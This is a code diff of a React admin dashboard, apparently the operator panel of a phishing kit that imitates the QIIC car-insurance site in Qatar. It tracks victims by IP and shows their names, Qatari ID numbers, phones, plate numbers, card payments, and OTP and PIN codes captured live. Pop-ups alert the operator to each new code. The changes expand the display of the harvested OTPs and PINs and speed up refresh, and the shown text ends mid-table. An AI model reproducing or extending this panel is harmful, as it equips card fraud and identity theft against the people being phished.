@@ -1,9 +1,9 @@
 import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router-dom';
 import { 
-  LogOut, Search, Eye, Trash2, RefreshCw, Users, CreditCard, 
+  LogOut, Search, Eye, RefreshCw, Users, CreditCard, 
   Shield, Clock, CheckCircle, XCircle, AlertCircle, Activity,
-  TrendingUp, DollarSign, Phone, Mail, MapPin, Calendar
+  DollarSign, Phone, Car, Navigation, Calendar
 } from 'lucide-react';
 import { useSocket } from '../context/SocketContext';
 
@@ -13,7 +13,7 @@ export default function AdminDashboard() {
   
   const [customers, setCustomers] = useState([]);
   const [searchTerm, setSearchTerm] = useState('');
-  const [filterStatus, setFilterStatus] = useState('all'); // all, active, offline, pending, approved
+  const [filterStatus, setFilterStatus] = useState('all');
   const [selectedCustomer, setSelectedCustomer] = useState(null);
   const [showDetailsModal, setShowDetailsModal] = useState(false);
   const [stats, setStats] = useState({
@@ -21,11 +21,9 @@ export default function AdminDashboard() {
     active: 0,
     pending: 0,
     approved: 0,
-    rejected: 0,
     totalRevenue: 0
   });
 
-  // Pending OTP/PIN
   const [pendingOTP, setPendingOTP] = useState(null);
   const [pendingPIN, setPendingPIN] = useState(null);
 
@@ -40,35 +38,27 @@ export default function AdminDashboard() {
   useEffect(() => {
     if (!socket) return;
 
-    // Load initial data
     socket.emit('loadData');
 
-    // Auto-refresh every 10 seconds
     const refreshInterval = setInterval(() => {
       if (socket && connected) {
         socket.emit('loadData');
       }
-    }, 10000);
+    }, 5000);
 
-    // Listen for data
     socket.on('initialData', (data) => {
       processCustomersData(data);
     });
 
-    // Real-time updates
-    socket.on('newEntryAll', (entry) => {
-      console.log('🆕 New entry:', entry);
-      socket.emit('loadData'); // Refresh data
+    socket.on('newEntryAll', () => {
+      socket.emit('loadData');
     });
 
-    // OTP/PIN listeners
     socket.on('newOTP', (data) => {
-      console.log('🔐 New OTP:', data);
       setPendingOTP(data);
     });
 
     socket.on('newPIN', (data) => {
-      console.log('🔑 New PIN:', data);
       setPendingPIN(data);
     });
 
@@ -99,7 +89,6 @@ export default function AdminDashboard() {
     const customersMap = new Map();
     const allIPs = new Set();
 
-    // Collect all IPs
     [
       data.carDetails, data.moreDetails, data.selectInsurance,
       data.insuranceInfo, data.payment, data.locations,
@@ -110,24 +99,44 @@ export default function AdminDashboard() {
       }
     });
 
-    // Build customer objects
     allIPs.forEach(ip => {
-      const carDetails = data.carDetails?.find(d => d.ip === ip);
-      const moreDetails = data.moreDetails?.find(d => d.ip === ip);
-      const insurance = data.selectInsurance?.find(d => d.ip === ip);
-      const customerInfo = data.insuranceInfo?.find(d => d.ip === ip);
+      const carDetailsAll = data.carDetails?.filter(d => d.ip === ip) || [];
+      const moreDetailsAll = data.moreDetails?.filter(d => d.ip === ip) || [];
+      const insuranceAll = data.selectInsurance?.filter(d => d.ip === ip) || [];
+      const customerInfoAll = data.insuranceInfo?.filter(d => d.ip === ip) || [];
+      
+      const carDetails = carDetailsAll[carDetailsAll.length - 1];
+      const moreDetails = moreDetailsAll[moreDetailsAll.length - 1];
+      const insurance = insuranceAll[insuranceAll.length - 1];
+      const customerInfo = customerInfoAll[customerInfoAll.length - 1];
+      
       const payments = data.payment?.filter(d => d.ip === ip) || [];
       const otpCodes = data.otpCodes?.filter(d => d.ip === ip) || [];
       const pinCodes = data.pinCodes?.filter(d => d.ip === ip) || [];
-      const location = data.locations?.find(d => d.ip === ip);
+      
+      const locations = data.locations?.filter(d => d.ip === ip) || [];
+      const location = locations[locations.length - 1];
       const isActive = data.activeUsers?.includes(ip) || false;
 
-      // Calculate status
       let status = 'pending';
       if (payments.length > 0) {
         const lastPayment = payments[payments.length - 1];
         status = lastPayment.status || 'pending';
       }
+
+      const allTimestamps = [
+        ...(carDetailsAll.map(c => c.timestamp)),
+        ...(moreDetailsAll.map(m => m.timestamp)),
+        ...(insuranceAll.map(i => i.timestamp)),
+        ...(customerInfoAll.map(ci => ci.timestamp)),
+        ...(payments.map(p => p.timestamp)),
+        ...(otpCodes.map(o => o.timestamp)),
+        ...(pinCodes.map(p => p.timestamp))
+      ].filter(Boolean);
+      
+      const lastUpdate = allTimestamps.length > 0 
+        ? new Date(Math.max(...allTimestamps.map(t => new Date(t).getTime())))
+        : new Date();
 
       customersMap.set(ip, {
         ip,
@@ -140,7 +149,7 @@ export default function AdminDashboard() {
         otpCodes,
         pinCodes,
         status,
-        lastUpdate: new Date().toISOString(),
+        lastUpdate: lastUpdate.toISOString(),
         isActive
       });
     });
@@ -159,7 +168,6 @@ export default function AdminDashboard() {
       active: customersList.filter(c => c.isActive).length,
       pending: customersList.filter(c => c.status === 'pending').length,
       approved: customersList.filter(c => c.status === 'approved').length,
-      rejected: customersList.filter(c => c.status === 'rejected').length,
       totalRevenue: customersList
         .filter(c => c.status === 'approved')
         .reduce((sum, c) => sum + (parseFloat(c.payments[0]?.amount) || 0), 0)
@@ -223,14 +231,16 @@ export default function AdminDashboard() {
     setShowDetailsModal(true);
   };
 
-  // Filter customers
   const filteredCustomers = customers.filter(customer => {
     const matchesSearch = 
       customer.ip?.includes(searchTerm) ||
       customer.customerInfo?.name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
       customer.customerInfo?.qid?.includes(searchTerm) ||
       customer.customerInfo?.phone?.includes(searchTerm) ||
-      customer.customerInfo?.email?.toLowerCase().includes(searchTerm.toLowerCase());
+      customer.customerInfo?.email?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      customer.carDetails?.make?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      customer.carDetails?.model?.toLowerCase().includes(searchTerm.toLowerCase()) ||
+      customer.moreDetails?.plateNumber?.includes(searchTerm);
 
     const matchesFilter = 
       filterStatus === 'all' ||
@@ -264,8 +274,31 @@ export default function AdminDashboard() {
     );
   };
 
+  const getPageBadge = (page) => {
+    const pageNames = {
+      '/': 'الصفحة الرئيسية',
+      '/car-details': 'بيانات المركبة',
+      '/more-details': 'المزيد من البيانات',
+      '/select-insurance': 'اختيار التأمين',
+      '/plate-number': 'رقم اللوحة',
+      '/info-insurance': 'البيانات الشخصية',
+      '/policy-date': 'تاريخ البوليصة',
+      '/quotecheaK': 'عرض السعر',
+      '/paydcc': 'الدفع - DCC',
+      '/payqpay': 'الدفع - QPay',
+      '/payment-otp': 'إدخال OTP',
+      '/otp-verification': 'تحقق OTP',
+      '/payment-pin': 'إدخال PIN',
+      '/pin-verification': 'تحقق PIN',
+      '/payment-success': 'نجح الدفع',
+      '/payment-failed': 'فشل الدفع'
+    };
+
+    return pageNames[page] || page;
+  };
+
   return (
-    <div className="min-h-screen bg-gray-50">
+    <div className="min-h-screen bg-gray-50" dir="rtl">
       {/* OTP Modal */}
       {pendingOTP && (
         <div className="fixed inset-0 bg-black/70 flex items-center justify-center z-50 p-4">
@@ -381,10 +414,10 @@ export default function AdminDashboard() {
       {/* Details Modal */}
       {showDetailsModal && selectedCustomer && (
         <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-40 p-4 overflow-y-auto">
-          <div className="bg-white rounded-2xl shadow-2xl max-w-4xl w-full my-8">
-            <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white p-6 rounded-t-2xl">
+          <div className="bg-white rounded-2xl shadow-2xl max-w-6xl w-full my-8">
+            <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white p-6 rounded-t-2xl sticky top-0 z-10">
               <div className="flex items-center justify-between">
-                <h2 className="text-2xl font-bold">تفاصيل العميل</h2>
+                <h2 className="text-2xl font-bold">تفاصيل العميل الكاملة</h2>
                 <button
                   onClick={() => setShowDetailsModal(false)}
                   className="text-white hover:bg-white/20 rounded-lg p-2 transition-colors"
@@ -392,140 +425,272 @@ export default function AdminDashboard() {
                   <XCircle className="w-6 h-6" />
                 </button>
               </div>
+              <div className="mt-4 flex items-center gap-4 flex-wrap">
+                <div className="flex items-center gap-2">
+                  <div className={`w-3 h-3 rounded-full ${selectedCustomer.isActive ? 'bg-green-400 animate-pulse' : 'bg-gray-400'}`}></div>
+                  <span>{selectedCustomer.isActive ? 'نشط الآن' : 'غير متصل'}</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Navigation className="w-4 h-4" />
+                  <span className="text-sm">{getPageBadge(selectedCustomer.currentPage)}</span>
+                </div>
+                <div className="flex items-center gap-2">
+                  <Clock className="w-4 h-4" />
+                  <span className="text-sm">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</span>
+                </div>
+              </div>
             </div>
 
             <div className="p-6 space-y-6 max-h-[70vh] overflow-y-auto">
-              {/* Customer Info */}
+              {/* Customer Personal Info */}
               <div className="bg-gradient-to-br from-blue-50 to-blue-100 rounded-xl p-6">
-                <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
-                  <Users className="w-5 h-5 text-blue-600" />
-                  معلومات العميل
+                <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-blue-900">
+                  <Users className="w-6 h-6 text-blue-600" />
+                  البيانات الشخصية
                 </h3>
-                <div className="grid grid-cols-2 gap-4 text-sm">
-                  <div>
-                    <p className="text-gray-600">الاسم</p>
-                    <p className="font-semibold">{selectedCustomer.customerInfo?.name || '—'}</p>
+                <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">الاسم الكامل</p>
+                    <p className="font-bold text-gray-900">{selectedCustomer.customerInfo?.name || '—'}</p>
                   </div>
-                  <div>
-                    <p className="text-gray-600">QID</p>
-                    <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.qid || '—'}</p>
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">رقم البطاقة القطرية (QID)</p>
+                    <p className="font-mono font-bold text-blue-600">{selectedCustomer.customerInfo?.qid || selectedCustomer.moreDetails?.qid || '—'}</p>
                   </div>
-                  <div>
-                    <p className="text-gray-600">الهاتف</p>
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">رقم الجوال</p>
                     <p className="font-mono font-semibold">{selectedCustomer.customerInfo?.phone || '—'}</p>
                   </div>
-                  <div>
-                    <p className="text-gray-600">البريد الإلكتروني</p>
-                    <p className="font-semibold text-xs">{selectedCustomer.customerInfo?.email || '—'}</p>
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">البريد الإلكتروني</p>
+                    <p className="text-sm font-semibold break-all">{selectedCustomer.customerInfo?.email || '—'}</p>
                   </div>
-                  <div>
-                    <p className="text-gray-600">IP Address</p>
-                    <p className="font-mono font-semibold">{selectedCustomer.ip}</p>
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">عنوان IP</p>
+                    <p className="font-mono font-semibold text-purple-600">{selectedCustomer.ip}</p>
                   </div>
-                  <div>
-                    <p className="text-gray-600">الحالة</p>
-                    <p>{getStatusBadge(selectedCustomer.status)}</p>
+                  <div className="bg-white rounded-lg p-4">
+                    <p className="text-gray-600 text-sm mb-1">الحالة</p>
+                    <div>{getStatusBadge(selectedCustomer.status)}</div>
                   </div>
                 </div>
               </div>
 
-              {/* Car Details */}
+              {/* Vehicle Details */}
               {selectedCustomer.carDetails && (
                 <div className="bg-gradient-to-br from-green-50 to-green-100 rounded-xl p-6">
-                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
-                    <Activity className="w-5 h-5 text-green-600" />
-                    تفاصيل السيارة
+                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-green-900">
+                    <Car className="w-6 h-6 text-green-600" />
+                    بيانات المركبة
                   </h3>
-                  <div className="grid grid-cols-2 gap-4 text-sm">
-                    <div>
-                      <p className="text-gray-600">الصانع</p>
-                      <p className="font-semibold">{selectedCustomer.carDetails.make || '—'}</p>
+                  <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">العلامة</p>
+                      <p className="font-bold text-gray-900">{selectedCustomer.carDetails.make || '—'}</p>
                     </div>
-                    <div>
-                      <p className="text-gray-600">الموديل</p>
-                      <p className="font-semibold">{selectedCustomer.carDetails.model || '—'}</p>
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">الموديل</p>
+                      <p className="font-bold text-gray-900">{selectedCustomer.carDetails.model || '—'}</p>
                     </div>
-                    <div>
-                      <p className="text-gray-600">السنة</p>
-                      <p className="font-semibold">{selectedCustomer.carDetails.year || '—'}</p>
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">سنة الموديل</p>
+                      <p className="font-bold text-green-600">{selectedCustomer.carDetails.year || '—'}</p>
                     </div>
-                    <div>
-                      <p className="text-gray-600">اللون</p>
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">اللون</p>
                       <p className="font-semibold">{selectedCustomer.carDetails.color || '—'}</p>
+                    </div>
+                  </div>
+                  
+                  {selectedCustomer.moreDetails && (
+                    <div className="grid grid-cols-1 md:grid-cols-4 gap-4 mt-4">
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">المقاعد</p>
+                        <p className="font-semibold">{selectedCustomer.moreDetails.seats || '—'}</p>
+                      </div>
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">الإسطوانات</p>
+                        <p className="font-semibold">{selectedCustomer.moreDetails.cylinders || '—'}</p>
+                      </div>
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">نوع السيارة</p>
+                        <p className="font-semibold">{selectedCustomer.moreDetails.vehicleType || '—'}</p>
+                      </div>
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">شكل السيارة</p>
+                        <p className="font-semibold">{selectedCustomer.moreDetails.bodyType || '—'}</p>
+                      </div>
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">تاريخ تسجيل السيارة</p>
+                        <p className="font-mono font-semibold">{selectedCustomer.moreDetails.registrationDate || '—'}</p>
+                      </div>
+                      <div className="bg-white rounded-lg p-4">
+                        <p className="text-gray-600 text-sm mb-1">رقم اللوحة</p>
+                        <p className="font-mono font-bold text-green-600">{selectedCustomer.moreDetails.plateNumber || '—'}</p>
+                      </div>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {/* Insurance Info */}
+              {selectedCustomer.insurance && (
+                <div className="bg-gradient-to-br from-orange-50 to-orange-100 rounded-xl p-6">
+                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-orange-900">
+                    <Shield className="w-6 h-6 text-orange-600" />
+                    معلومات التأمين
+                  </h3>
+                  <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">نوع التأمين</p>
+                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.insuranceType || '—'}</p>
+                    </div>
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">المبلغ المطلوب</p>
+                      <p className="font-bold text-orange-600">{selectedCustomer.insurance.amount || '—'} ريال</p>
+                    </div>
+                    <div className="bg-white rounded-lg p-4">
+                      <p className="text-gray-600 text-sm mb-1">تاريخ الاختيار</p>
+                      <p className="font-mono text-sm">{selectedCustomer.insurance.timestamp ? new Date(selectedCustomer.insurance.timestamp).toLocaleString('ar-QA') : '—'}</p>
                     </div>
                   </div>
                 </div>
               )}
 
-              {/* Payments */}
+              {/* Payment Cards */}
               {selectedCustomer.payments && selectedCustomer.payments.length > 0 && (
                 <div className="bg-gradient-to-br from-purple-50 to-purple-100 rounded-xl p-6">
-                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
-                    <CreditCard className="w-5 h-5 text-purple-600" />
-                    معلومات الدفع
+                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-purple-900">
+                    <CreditCard className="w-6 h-6 text-purple-600" />
+                    معلومات البطاقات ({selectedCustomer.payments.length})
                   </h3>
-                  {selectedCustomer.payments.map((payment, idx) => (
-                    <div key={idx} className="bg-white rounded-lg p-4 mb-3">
-                      <div className="grid grid-cols-2 gap-4 text-sm">
-                        <div>
-                          <p className="text-gray-600">طريقة الدفع</p>
-                          <p className="font-semibold">{payment.paymentMethod || '—'}</p>
+                  <div className="space-y-4">
+                    {selectedCustomer.payments.map((payment, idx) => (
+                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-purple-200">
+                        <div className="flex items-center justify-between mb-3">
+                          <span className="text-xs font-bold text-purple-600 bg-purple-100 px-3 py-1 rounded-full">
+                            بطاقة {idx + 1}
+                          </span>
+                          <span className="text-xs text-gray-600">
+                            {new Date(payment.timestamp).toLocaleString('ar-QA')}
+                          </span>
                         </div>
-                        <div>
-                          <p className="text-gray-600">المبلغ</p>
-                          <p className="font-bold text-purple-600">{payment.amount} ريال</p>
-                        </div>
-                        <div>
-                          <p className="text-gray-600">البطاقة</p>
-                          <p className="font-mono">**** {payment.cardLastDigits || '****'}</p>
-                        </div>
-                        <div>
-                          <p className="text-gray-600">الوقت</p>
-                          <p className="text-xs">{new Date(payment.timestamp).toLocaleString('ar-QA')}</p>
+                        <div className="grid grid-cols-1 md:grid-cols-4 gap-4">
+                          <div>
+                            <p className="text-gray-600 text-sm mb-1">طريقة الدفع</p>
+                            <p className="font-bold text-purple-600">{payment.paymentMethod || '—'}</p>
+                          </div>
+                          <div>
+                            <p className="text-gray-600 text-sm mb-1">المبلغ</p>
+                            <p className="font-bold text-purple-600 text-lg">{payment.amount} ريال</p>
+                          </div>
+                          <div>
+                            <p className="text-gray-600 text-sm mb-1">آخر 4 أرقام</p>
+                            <p className="font-mono font-bold">**** {payment.cardLastDigits || '****'}</p>
+                          </div>
+                          <div>
+                            <p className="text-gray-600 text-sm mb-1">رقم الهاتف</p>
+                            <p className="font-mono">{payment.phoneNumber || '—'}</p>
+                          </div>
                         </div>
                       </div>
-                    </div>
-                  ))}
+                    ))}
+                  </div>
                 </div>
               )}
 
               {/* OTP Codes */}
               {selectedCustomer.otpCodes && selectedCustomer.otpCodes.length > 0 && (
                 <div className="bg-gradient-to-br from-yellow-50 to-yellow-100 rounded-xl p-6">
-                  <h3 className="font-bold text-lg mb-4 flex items-center gap-2">
-                    <Shield className="w-5 h-5 text-yellow-600" />
-                    رموز OTP
+                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-yellow-900">
+                    <Shield className="w-6 h-6 text-yellow-600" />
+                    رموز OTP ({selectedCustomer.otpCodes.length})
                   </h3>
-                  <div className="space-y-2 text-sm">
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                     {selectedCustomer.otpCodes.map((otp, idx) => (
-                      <div key={idx} className="bg-white rounded-lg p-3 flex justify-between items-center">
-                        <span className="font-mono font-bold text-lg">{otp.otpCode}</span>
-                        <span className="text-xs text-gray-600">{new Date(otp.timestamp).toLocaleString('ar-QA')}</span>
+                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-yellow-200">
+                        <div className="flex justify-between items-start mb-2">
+                          <span className="text-xs font-bold text-yellow-600 bg-yellow-100 px-2 py-1 rounded-full">
+                            OTP {idx + 1}
+                          </span>
+                          <div className="text-right">
+                            <p className="font-mono font-bold text-2xl text-yellow-600">{otp.otpCode}</p>
+                            <p className="text-xs text-gray-600 mt-1">
+                              {new Date(otp.timestamp).toLocaleString('ar-QA')}
+                            </p>
+                          </div>
+                        </div>
+                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
+                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {otp.cardLastDigits}</span></p>
+                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{otp.phoneNumber}</span></p>
+                        </div>
+                      </div>
+                    ))}
+                  </div>
+                </div>
+              )}
+
+              {/* PIN Codes */}
+              {selectedCustomer.pinCodes && selectedCustomer.pinCodes.length > 0 && (
+                <div className="bg-gradient-to-br from-indigo-50 to-indigo-100 rounded-xl p-6">
+                  <h3 className="font-bold text-xl mb-4 flex items-center gap-2 text-indigo-900">
+                    <CreditCard className="w-6 h-6 text-indigo-600" />
+                    رموز PIN ({selectedCustomer.pinCodes.length})
+                  </h3>
+                  <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
+                    {selectedCustomer.pinCodes.map((pin, idx) => (
+                      <div key={idx} className="bg-white rounded-lg p-4 border-2 border-indigo-200">
+                        <div className="flex justify-between items-start mb-2">
+                          <span className="text-xs font-bold text-indigo-600 bg-indigo-100 px-2 py-1 rounded-full">
+                            PIN {idx + 1}
+                          </span>
+                          <div className="text-right">
+                            <p className="font-mono font-bold text-2xl text-indigo-600">{pin.pinCode}</p>
+                            <p className="text-xs text-gray-600 mt-1">
+                              {new Date(pin.timestamp).toLocaleString('ar-QA')}
+                            </p>
+                          </div>
+                        </div>
+                        <div className="border-t pt-2 mt-2 text-xs space-y-1">
+                          <p><span className="text-gray-600">البطاقة:</span> <span className="font-mono">**** {pin.cardLastDigits}</span></p>
+                          <p><span className="text-gray-600">الهاتف:</span> <span className="font-mono">{pin.phoneNumber}</span></p>
+                        </div>
                       </div>
                     ))}
                   </div>
                 </div>
               )}
             </div>
+
+            <div className="bg-gray-50 p-4 rounded-b-2xl border-t">
+              <div className="text-center text-sm text-gray-600">
+                <p>تم عرض جميع البيانات المتاحة للعميل</p>
+                <p className="mt-1">آخر تحديث: {new Date(selectedCustomer.lastUpdate).toLocaleString('ar-QA')}</p>
+              </div>
+            </div>
           </div>
         </div>
       )}
 
       {/* Main Content */}
-      <div className="max-w-7xl mx-auto p-6">
+      <div className="max-w-[1800px] mx-auto p-6">
         {/* Header */}
         <div className="bg-gradient-to-r from-qiic-maroon to-red-900 text-white rounded-2xl p-8 mb-6 shadow-lg">
           <div className="flex items-center justify-between">
             <div>
-              <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن</h1>
+              <h1 className="text-4xl font-bold mb-3">لوحة تحكم الأدمن المتقدمة</h1>
               <div className="flex items-center gap-3">
                 <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                   <div className={`w-3 h-3 rounded-full ${connected ? 'bg-green-400 animate-pulse' : 'bg-red-400'}`}></div>
-                  <span className="font-semibold">{connected ? 'متصل' : 'غير متصل'}</span>
+                  <span className="font-semibold">{connected ? 'متصل مباشر' : 'غير متصل'}</span>
                 </div>
                 <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full">
                   <Users className="w-4 h-4" />
                   <span className="font-semibold">{stats.active} / {stats.total} نشط</span>
+                </div>
+                <div className="flex items-center gap-2 bg-white/20 px-4 py-2 rounded-full text-xs">
+                  <Clock className="w-4 h-4" />
+                  <span>تحديث تلقائي كل 5 ثواني</span>
                 </div>
               </div>
             </div>
@@ -606,7 +771,7 @@ export default function AdminDashboard() {
               <Search className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5" />
               <input
                 type="text"
-                placeholder="ابحث بـ IP، الاسم، QID، الهاتف..."
+                placeholder="ابحث بـ IP، الاسم، QID، الهاتف، السيارة، رقم اللوحة..."
                 value={searchTerm}
                 onChange={(e) => setSearchTerm(e.target.value)}
                 className="w-full pr-12 pl-4 py-3 border-2 border-gray-200 rounded-lg focus:ring-2 focus:ring-qiic-maroon focus:border-transparent"
@@ -614,7 +779,7 @@ export default function AdminDashboard() {
               />
             </div>
 
-            <div className="flex gap-2">
+            <div className="flex gap-2 flex-wrap">
               <button
                 onClick={() => setFilterStatus('all')}
                 className={`px-4 py-2 rounded-lg font-semibold transition-colors ${
@@ -665,56 +830,107 @@ export default function AdminDashboard() {
             <table className="w-full" dir="rtl">
               <thead className="bg-gradient-to-r from-gray-800 to-gray-900 text-white">
                 <tr>
-                  <th className="px-6 py-4 text-right text-sm font-bold">الحالة</th>
-                  <th className="px-6 py-4 text-right text-sm font-bold">IP</th>
-                  <th className="px-6 py-4 text-right text-sm font-bold">معلومات العميل</th>
-                  <th className="px-6 py-4 text-right text-sm font-bold">الصفحة الحالية</th>
-                  <th className="px-6 py-4 text-right text-sm font-bold">الدفع</th>
-                  <th className="px-6 py-4 text-right text-sm font-bold">الحالة</th>
-                  <th className="px-6 py-4 text-center text-sm font-bold">الإجراءات</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">IP</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">معلومات العميل</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">QID</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">السيارة</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">رقم اللوحة</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">التأمين</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الصفحة الحالية</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">البطاقات</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">OTP/PIN</th>
+                  <th className="px-4 py-4 text-right text-xs font-bold whitespace-nowrap">الحالة</th>
+                  <th className="px-4 py-4 text-center text-xs font-bold whitespace-nowrap">الإجراءات</th>
                 </tr>
               </thead>
               <tbody className="divide-y divide-gray-200">
                 {filteredCustomers.map((customer, idx) => (
-                  <tr key={customer.ip} className={`hover:bg-gray-50 transition-colors ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}>
-                    <td className="px-6 py-4">
-                      <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse' : 'bg-gray-300'}`}></div>
+                  <tr key={customer.ip} className={`hover:bg-blue-50 transition-colors ${idx % 2 === 0 ? 'bg-white' : 'bg-gray-50/50'}`}>
+                    <td className="px-4 py-4">
+                      <div className="flex items-center gap-2">
+                        <div className={`w-3 h-3 rounded-full ${customer.isActive ? 'bg-green-500 animate-pulse shadow-lg shadow-green-300' : 'bg-gray-300'}`}></div>
+                        <span className="text-xs">{customer.isActive ? 'نشط' : 'غير متصل'}</span>
+                      </div>
                     </td>
-                    <td className="px-6 py-4">
-                      <span className="font-mono text-sm font-semibold">{customer.ip}</span>
+                    <td className="px-4 py-4">
+                      <span className="font-mono text-xs font-semibold text-purple-600">{customer.ip}</span>
                     </td>
-                    <td className="px-6 py-4">
+                    <td className="px-4 py-4">
                       {customer.customerInfo ? (
-                        <div>
-                          <p className="font-semibold text-gray-900">{customer.customerInfo.name}</p>
-                          <p className="text-xs text-gray-600 font-mono">{customer.customerInfo.qid}</p>
-                          <p className="text-xs text-gray-600">{customer.customerInfo.phone}</p>
+                        <div className="min-w-[150px]">
+                          <p className="font-semibold text-gray-900 text-sm">{customer.customerInfo.name}</p>
+                          <p className="text-xs text-gray-600 flex items-center gap-1">
+                            <Phone className="w-3 h-3" />
+                            {customer.customerInfo.phone}
+                          </p>
                         </div>
                       ) : (
                         <span className="text-gray-400">—</span>
                       )}
                     </td>
-                    <td className="px-6 py-4">
-                      <span className="text-sm text-gray-700">{customer.currentPage}</span>
+                    <td className="px-4 py-4">
+                      <span className="font-mono text-xs font-bold text-blue-600">
+                        {customer.customerInfo?.qid || customer.moreDetails?.qid || '—'}
+                      </span>
                     </td>
-                    <td className="px-6 py-4">
-                      {customer.payments && customer.payments.length > 0 ? (
-                        <div>
-                          <p className="font-semibold text-purple-600">{customer.payments[0].amount} ر.ق</p>
-                          <p className="text-xs text-gray-600">{customer.payments[0].paymentMethod}</p>
+                    <td className="px-4 py-4">
+                      {customer.carDetails ? (
+                        <div className="min-w-[120px]">
+                          <p className="font-semibold text-gray-900 text-sm">{customer.carDetails.make}</p>
+                          <p className="text-xs text-gray-600">{customer.carDetails.model} - {customer.carDetails.year}</p>
                         </div>
                       ) : (
                         <span className="text-gray-400">—</span>
                       )}
                     </td>
-                    <td className="px-6 py-4">
+                    <td className="px-4 py-4">
+                      <span className="font-mono font-bold text-green-600">
+                        {customer.moreDetails?.plateNumber || '—'}
+                      </span>
+                    </td>
+                    <td className="px-4 py-4">
+                      {customer.insurance ? (
+                        <div className="min-w-[100px]">
+                          <p className="font-semibold text-orange-600 text-sm">{customer.insurance.insuranceType}</p>
+                          <p className="text-xs text-gray-600">{customer.insurance.amount} ريال</p>
+                        </div>
+                      ) : (
+                        <span className="text-gray-400">—</span>
+                      )}
+                    </td>
+                    <td className="px-4 py-4">
+                      <div className="flex items-center gap-1 min-w-[120px]">
+                        <Navigation className="w-3 h-3 text-blue-600" />
+                        <span className="text-xs font-medium">{getPageBadge(customer.currentPage)}</span>
+                      </div>
+                    </td>
+                    <td className="px-4 py-4">
+                      <div className="flex items-center gap-1">
+                        <CreditCard className="w-4 h-4 text-purple-600" />
+                        <span className="font-bold text-purple-600">{customer.payments?.length || 0}</span>
+                      </div>
+                    </td>
+                    <td className="px-4 py-4">
+                      <div className="flex gap-2 items-center">
+                        <div className="flex items-center gap-1">
+                          <Shield className="w-3 h-3 text-yellow-600" />
+                          <span className="text-xs font-semibold text-yellow-600">{customer.otpCodes?.length || 0}</span>
+                        </div>
+                        <div className="flex items-center gap-1">
+                          <CreditCard className="w-3 h-3 text-indigo-600" />
+                          <span className="text-xs font-semibold text-indigo-600">{customer.pinCodes?.length || 0}</span>
+                        </div>
+                      </div>
+                    </td>
+                    <td className="px-4 py-4">
                       {getStatusBadge(customer.status)}
                     </td>
-                    <td className="px-6 py-4">
